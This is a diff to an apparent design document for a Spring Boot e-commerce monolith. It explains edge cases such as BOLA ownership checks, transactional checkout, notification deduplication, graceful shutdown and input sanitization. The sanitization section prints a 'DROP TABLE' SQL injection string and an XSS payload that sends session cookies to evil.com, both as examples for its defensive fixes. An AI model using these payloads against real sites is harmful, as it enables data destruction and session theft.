+**Trade-off:** Every JWT validation requires a DB (or cache) lookup — JWT's "stateless"
+advantage is partially lost. Mitigate with a Redis cache of token versions with a short
+TTL (60 seconds). The 60-second window is acceptable: a revoked attacker can still
+make requests for 60 seconds (vs. 23 hours without this mechanism).
+
+---
+
+## Edge Case #16 — Address Ownership (BOLA — Broken Object Level Authorization)
+
+### The Problem
+BOLA (Broken Object Level Authorization — OWASP API Top 10 #1) is the most exploited
+API vulnerability. The attack:
+
+```
+User Alice (id=1) has address id=5
+User Bob (id=2) makes request:
+  DELETE /users/1/addresses/5
+  Authorization: Bearer <bob's token>
+```
+
+If the service only checks "is the user authenticated?" without checking "does this user
+OWN address 5?", Bob can delete Alice's address. Or worse, read Alice's shipping history.
+
+### Execution Flow
+
+```
+Bob                             App                              DB
+  │                               │                               │
+  ├─ DELETE /addresses/5 ─────────►│                               │
+  │  (Bob's JWT: userId=2)        │                               │
+  │                               ├─ findById(5) ────────────────►│
+  │                               │◄─ address {id=5, userId=1} ───┤
+  │                               │                               │
+  │                               │  address.userId (1) ≠         │
+  │                               │  jwtUserId (2)                │
+  │                               │  → throw ForbiddenException   │
+  │◄─ 403 Forbidden ──────────────┤                               │
+  │  "You don't own this resource"│                               │
+```
+
+### The Solution
+```java
+public void deleteAddress(UUID requestingUserId, UUID addressId) {
+    AddressEntity address = addressRepo.findById(addressId)
+        .orElseThrow(() -> new ResourceNotFoundException("Address", addressId));
+    
+    // BOLA check — must happen EVERY time, in the service layer
+    if (!address.getUserId().equals(requestingUserId)) {
+        // Return 403 (not 404) so the requester knows they're unauthorized
+        throw new ForbiddenException("Access denied to address " + addressId);
+    }
+    
+    addressRepo.delete(address);
+}
+```
+
+**Why 403 and not 404?** Debate is ongoing in the security community. Returning 404
+("resource not found") leaks no information about existence, which is slightly more
+secure. But 403 gives a clearer signal to legitimate users ("wrong account") vs.
+bots (who can enumerate both anyway). Our choice: 403 for better developer UX.
+
+**Trade-off:** Every new endpoint that operates on user-owned resources must add this check.
+It's easy to forget. Solution: a `@OwnershipRequired` AOP annotation that
+automatically performs the check, removing the manual burden from each service method.
+
+---
+
+## Edge Case #17 — Checkout Atomicity (The Multi-Step Transaction)
+
+### The Problem
+Checkout involves multiple steps that must ALL succeed or ALL fail:
+1. Validate cart items and prices
+2. Reserve inventory (decrement stock)
+3. Create order record
+4. Apply coupon (decrement usage count)
+5. Create payment record
+
+If step 3 succeeds but step 4 fails (coupon error), the order exists but the coupon
+wasn't applied — inconsistent state. If step 2 succeeds but step 5 fails, inventory
+is decremented but no order exists — phantom inventory loss.
+
+### Execution Flow
+
+```
+  ┌─────────────────────── Single @Transactional boundary ───────────────────────┐
+  │                                                                               │
+  │  1. validatePrices()      ──► price mismatch? → throw → ROLLBACK ALL         │
+  │  2. reserveInventory()    ──► OOS? → throw → ROLLBACK ALL                    │
+  │  3. createOrder()         ──► DB error? → throw → ROLLBACK ALL               │
+  │  4. applyCoupon()         ──► invalid? → throw → ROLLBACK ALL (incl. steps 2,3)
+  │  5. createPaymentRecord() ──► success → COMMIT ALL                           │
+  │                                                                               │
+  └───────────────────────────────────────────────────────────────────────────────┘
+
+  If ANY step throws, the transaction rolls back ALL previous steps atomically.
+  The DB returns to the exact state it was in before checkout started.
+```
+
+### The Solution
+```java
+@Transactional(timeout = 10)  // release connection if stuck > 10s (see Edge Case #24)
+public CheckoutResponse checkout(UUID userId, CheckoutRequest req) {
+    // All steps in one transaction — either all commit or all rollback
+    validatePrices(req.cartItems());
+    reserveInventory(req.cartItems());
+    OrderEntity order = createOrder(userId, req);
+    if (req.couponCode() != null) applyCoupon(req.couponCode(), userId, order);
+    PaymentEntity payment = createPaymentRecord(order);
+    publishOrderCreatedEvent(order);  // outbox write in same TX (Edge Case #11)
+    return buildResponse(order, payment);
+}
+```
+
+**Trade-off:** A single long transaction holds DB connections and locks throughout all steps.
+With a slow inventory check (step 2), the connection is held while that query runs.
+The `timeout = 10` prevents this from hanging forever. For systems with >1000 concurrent
+checkouts, consider the Saga pattern (compensating transactions) for horizontal scaling —
+but Saga is significantly more complex to implement and debug.
+
+---
+
+## Edge Case #18 — Notification Deduplication
+
+### The Problem
+The Outbox poller (Edge Case #11) guarantees "at-least-once" delivery — it will retry
+until it confirms the notification was sent. This means the notification service might
+receive the same event multiple times:
+- First delivery: notification sent successfully, but the "mark as published" DB update fails → retry
+- Second delivery: notification sent again → user gets two "Your order was placed!" emails
+
+### Execution Flow
+
+```
+Outbox Poller                    Notification Service           DB
+  │                               │                              │
+  ├─ Deliver event (orderId=99) ──►│                              │
+  │                               ├─ SELECT notification_id ────►│
+  │                               │  WHERE type='ORDER' AND      │
+  │                               │  reference_id='99'           │
+  │                               │◄─ (no rows) ─────────────────┤
+  │                               ├─ send email ✓                │
+  │                               ├─ INSERT INTO notifications ──►│
+  │                               │  (type, reference_id, ...)   │
+  │                               │◄─ OK ────────────────────────┤
+  │◄─ Ack ────────────────────────┤                              │
+  │  [poller "mark published"     │                              │
+  │   update fails — retries]     │                              │
+  │                               │                              │
+  ├─ Deliver event (orderId=99) ──►│  (RETRY — same event)        │
+  │                               ├─ SELECT notification_id ────►│
+  │                               │◄─ (row found!) ──────────────┤
+  │                               │  → skip — already sent ✓     │
+  │◄─ Ack ────────────────────────┤                              │
+```
+
+### The Solution
+```java
+// 1. DB-level uniqueness prevents duplicates even under race conditions:
+// UNIQUE(notification_type, reference_id)
+
+// 2. Application-level idempotency check (fast path — avoids DB write on duplicate):
+public void sendOrderConfirmation(UUID orderId) {
+    if (notificationRepo.existsByTypeAndReferenceId("ORDER_CONFIRMED", orderId)) {
+        log.debug("Notification already sent for order {}, skipping", orderId);
+        return;
+    }
+    emailProvider.send(buildEmail(orderId));
+    notificationRepo.save(buildNotificationRecord(orderId));
+}
+```
+
+**Trade-off:** Still "at-least-once" — if the `save()` fails after `emailProvider.send()`,
+the email was sent but not recorded. The next delivery sends a second email.
+True "exactly-once" notification requires two-phase commit between the app and the email
+provider — which no email provider supports. Accept "at-least-once" and keep retry
+intervals long enough that duplicate emails are rare (not every 30 seconds).
+
+---
+
+## Edge Case #19 — Graceful Shutdown (Zero Downtime Deploys)
+
+### The Problem
+A new version is deployed. The old server process receives `SIGTERM`. Without graceful
+shutdown, the JVM exits immediately:
+- 50 in-flight checkout requests → mid-transaction kill → partial writes → data corruption
+- Payment callbacks arrive → 502 Bad Gateway → gateway retries indefinitely
+- Long-running reports → incomplete results saved to DB
+
+### Execution Flow
+
+```
+Load Balancer               Old Server (shutting down)         New Server (starting)
+  │                               │                               │
+  │  [Deploy triggered]           │                               │
+  │                               │◄─── SIGTERM ──────────────────┤
+  │                               │                               │
+  │                               │  1. Stop accepting new conns  │
+  │                               │     (HTTP listener closes)    │
+  │                               │                               │
+  │  [New requests → new server]  │  2. Wait for in-flight        │
+  │  ─────────────────────────────────────────────────────────────►│
+  │                               │     requests to complete     │
+  │                               │     (max 30 seconds)         │
+  │                               │                               │
+  │                               │  3. In-flight requests finish │
+  │  [Old server still serving    │     ← 15 seconds later ─────  │
+  │   existing connections]       │                               │
+  │                               │  4. JVM exits cleanly ✓      │
+```
+
+### The Solution
+```yaml
+# application.yml
+server:
+  shutdown: graceful  # Spring Boot 2.3+ — waits for active requests
+
+spring:
+  lifecycle:
+    timeout-per-shutdown-phase: 30s  # max wait time
+```
+
+```java
+// Scheduled jobs: respond to shutdown signal
+@Scheduled(fixedDelay = 500)
+public void pollOutbox() {
+    if (!running) return;  // stop processing immediately on shutdown signal
+    // ... process outbox messages
+}
+
+@PreDestroy
+public void onShutdown() {
+    this.running = false;
+}
+```
+
+**Trade-off:** Slow in-flight requests delay the shutdown (up to `timeout-per-shutdown-phase`).
+During a deploy, the old server might stay alive for 30 seconds while serving long-running
+requests. For most web APIs (sub-second responses), shutdown completes in milliseconds.
+For long-running batch jobs, add explicit interrupt handling.
+
+---
+
+## Edge Case #20 — Input Sanitization (SQL Injection + XSS Prevention)
+
+### The Problem
+Unsanitized user input is the #1 cause of web application vulnerabilities (OWASP):
+
+**SQL Injection:**
+```
+Product search: ?q=laptop'; DROP TABLE products; --
+Naive query:    "SELECT * FROM products WHERE name = 'laptop'; DROP TABLE products; --'"
+Result:         products table deleted
+```
+
+**Cross-Site Scripting (XSS):**
+```
+Product review: "<script>document.location='https://evil.com?cookie='+document.cookie</script>"
+If stored and rendered unescaped: steals every user's session cookie who views the review
+```
+
+### Execution Flow
+
+```
+Attacker                        App                              DB
+  │                               │                               │
+  ├─ POST /reviews ───────────────►│                               │
+  │  {content: "<script>steal()"}  │                               │
+  │                               ├─ @Valid validates fields      │
+  │                               ├─ @Size(max=2000) ✓            │
+  │                               ├─ sanitize HTML entities:      │
+  │                               │  "<" → "&lt;"                 │
+  │                               │  ">" → "&gt;"                 │
+  │                               ├─ INSERT INTO reviews ─────────►│
+  │                               │  (parameterized query) ✓     │
+  │                               │  content = "&lt;script&gt;..." │
+  │                               │                               │
+  │  [Victim views review page]   │                               │
+  │                               │  Renders: <script>steal()    │
+  │                               │  as literal text — harmless ✓ │
+```
+
+### The Solution — Four Layers
+
+**Layer 1 — Parameterized queries (Spring Data JPA default):**
+```java
+// WRONG (string concatenation):
+String sql = "SELECT * FROM products WHERE name = '" + userInput + "'";
+
+// RIGHT (parameterized — Spring Data JPA default):
+productRepo.findByName(userInput);
+// → Hibernate: SELECT * FROM products WHERE name = ?  [userInput bound separately]
+```
+The `?` placeholder tells the DB driver: "this is data, never code." SQL injection is
+structurally impossible.
+
+**Layer 2 — Bean Validation (`@Valid`):**
+```java
+public record SearchRequest(
+    @NotBlank @Size(max = 200) String query,
+    @Min(0) @Max(10000) BigDecimal maxPrice
+) {}
+```
+
+**Layer 3 — HTML sanitization for stored content (reviews, descriptions):**
+```java
+// Using OWASP Java HTML Sanitizer or Jsoup:
+String safeContent = Jsoup.clean(userInput, Safelist.basic());
+```
+
+**Layer 4 — Security headers (HTTP response headers):**
+```
+Content-Security-Policy: default-src 'self'   ← blocks external script loading
+X-Content-Type-Options: nosniff               ← prevents MIME sniffing attacks
+X-Frame-Options: DENY                         ← blocks clickjacking
+```
+
+**Trade-off:** Validation adds latency (microseconds — negligible). HTML sanitization
+may strip legitimate formatting (e.g., markdown in product descriptions). Solution:
+use a whitelist-based sanitizer (`Safelist.basic()`) that allows harmless tags (`<b>`, `<i>`,
+`<a href>`) while blocking all script-related elements.
 
 ---
 
@@ -439,7 +1670,7 @@ permanent failures indicate a real problem (broken email provider, bad event dat
 not be automatically retried. An automatic retry after fixing the root cause IS supported via
 the replay endpoint.
 
-**Code:** [`DeadLetterMessageEntity`](../ecommerce-monolith/src/main/java/com/ecommerce/monolith/infrastructure/outbox/DeadLetterMessageEntity.java) | [`V2__additional_edge_cases.sql`](../ecommerce-monolith/src/main/resources/db/migration/V2__additional_edge_cases.sql)
+**Code:** [`DeadLetterMessageEntity`](../ecommerce-monolith/src/main/java/com/ecommerce/monolith/infrastructure/outbox/DeadLetterMessageEntity.java) | [`V2__add_coupons_dead_letter_table.sql`](../ecommerce-monolith/src/main/resources/db/migration/V2__add_coupons_dead_letter_table.sql)
 
 ---
 
@@ -637,7 +1868,7 @@ as-is (incorrect, but immutable). Mitigation: add a `correction_note` column tha
 (not a status change — just a human note explaining the error). The wrong record stays; the
 correction is annotated. This preserves audit integrity while allowing explanation.
 
-**Code:** [`OrderStatusHistoryEntity @Immutable`](../ecommerce-monolith/src/main/java/com/ecommerce/monolith/domain/order/entity/OrderStatusHistoryEntity.java) | [`V2__additional_edge_cases.sql (RLS policies)`](../ecommerce-monolith/src/main/resources/db/migration/V2__additional_edge_cases.sql)
+**Code:** [`OrderStatusHistoryEntity @Immutable`](../ecommerce-monolith/src/main/java/com/ecommerce/monolith/domain/order/entity/OrderStatusHistoryEntity.java) | [`V2__add_coupons_dead_letter_table.sql (RLS policies)`](../ecommerce-monolith/src/main/resources/db/migration/V2__add_coupons_dead_letter_table.sql)
 
 ---
 
